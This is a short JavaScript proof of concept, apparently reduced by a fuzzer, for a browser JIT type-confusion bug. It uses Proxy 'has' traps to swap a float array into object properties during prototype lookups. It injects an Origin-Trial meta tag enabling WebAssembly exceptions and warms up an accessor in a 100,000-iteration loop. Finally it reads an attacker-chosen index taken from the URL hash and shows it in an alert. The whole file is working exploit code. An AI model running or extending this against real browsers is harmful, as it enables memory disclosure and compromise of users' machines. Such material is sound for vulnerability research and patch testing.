try {
    array = [1.1];
    array.stable_map = 1;
    const v6 = {};
    const v12 = {
        has() {
            object_1.Exception = array;
            object_2.deprecated_map = 1.1;
            object_2.Exception = array;
            return false;
        },
    };
    let v13;
    try { v13 = new Proxy(v6, v12); } catch (e) {}
    proxy = v13;
    object_1 = { __proto__: proxy };
    object_1.deprecated_map = 0;
    object_2 = { __proto__: proxy };
    WebAssembly = object_1;
    let v25;
    try { v25 = document.createElement("meta"); } catch (e) {}
    meta = v25;
    meta.httpEquiv = "Origin-Trial";
    meta.content = ((("AkraUQ8UvLgBl/MKvqU9ZuwZ2csKJU75hMutXva8msph9EKaxUkf1fmA4V3y8" + "SLmwlYwFzKQHL2w+lwlIzfcJgsAAAB2eyJvcmlnaW4iOiJodHRwczovL2FuYW") + "xvZy1mYXN0bmVzcy0yMzAyMTkudWMuci5hcHBzcG90LmNvbTo0NDMiLCJmZWF") + "0dXJlIjoiV2ViQXNzZW1ibHlFeGNlcHRpb25zIiwiZXhwaXJ5IjoxNjM3MTA3") + "MTk5fQ==";
    const v38 = document?.head;
    try { v38.appendChild(meta); } catch (e) {}
    delete object_1?.Exception;
    const v41 = (a42, a43) => {
        return a42?.Exception?.[a43];
    };
    jit = v41;
    for (let i48 = 0; i48 < 100000; ++i48) {
        try { jit(object_2, 0); } catch (e) {}
    }
    const v60 = location?.hash;
    let v61;
    try { v61 = v60.substring(1); } catch (e) {}
    let v63;
    try { v63 = Number(v61); } catch (e) {}
    let v65;
    try { v65 = jit(object_1, v63); } catch (e) {}
    try { alert(v65); } catch (e) {}
} catch(e68) {
}
